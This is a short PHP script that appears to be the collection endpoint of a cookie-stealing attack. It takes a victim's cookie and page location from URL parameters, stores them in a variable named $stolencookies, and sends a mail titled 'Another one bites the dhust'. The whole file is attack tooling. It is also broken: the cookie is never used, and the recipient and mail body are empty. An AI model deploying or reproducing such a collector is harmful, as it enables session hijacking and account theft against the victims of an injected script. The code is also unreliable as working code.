<?php 

if (($_GET['cookie'] == "") || ($_GET['location'] == "")) {
}

else {
    $cookie   = $_GET['cookie'];
    $location = $_GET['location'];

    $stolencookies = "Open the browser: " . $location;

    $email     = "d3let@protonmail.com";
    $recipient = "";
    $mail_body = "";
    $subject   = "Another one bites the dhust - " . $location;
    $header    = " From: $email";

    mail($recipient, $subject, $mail_body, $header);
}

?>